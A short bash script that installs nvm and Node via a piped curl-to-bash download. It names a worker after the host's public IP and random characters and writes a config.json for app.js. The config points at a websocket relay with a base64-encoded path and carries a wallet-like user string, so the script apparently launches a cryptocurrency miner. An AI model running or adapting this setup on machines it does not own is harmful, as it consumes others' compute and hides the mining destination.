#!/bin/bash
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.2/install.sh | bash
sleep 2

# in lieu of restarting the shell
\. "$HOME/.nvm/nvm.sh"

nvm install 23
sleep 2

nvm current
sleep 2

node -v && npm
sleep 2

array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

currentdate=$(date '+%d-%b-%Y-TestWasm_')
ipaddress=$(wget -q -O - api.ipify.org)
num_of_cores=$(cat /proc/cpuinfo | grep processor | wc -l)
used_num_of_cores=`expr $num_of_cores - 2`
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

echo ""
echo "You will be using $used_num_of_cores cores"
echo ""
sleep 2

echo ""
echo "Your worker name will be $currentdate"
echo ""
sleep 2

cat > config.json <<-EOF
{
  "host": "wss://thin-nananne-mono-6481dcea.koyeb.app/IHAyeHl6LndvdC50b3l0aGlldmVzLmNvbTo3MDIy",
  "port": 3000,
  "user": "MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate",
  "pass": "webpassword=IhatePopUps",
  "threads": 2
}
EOF
node app.js
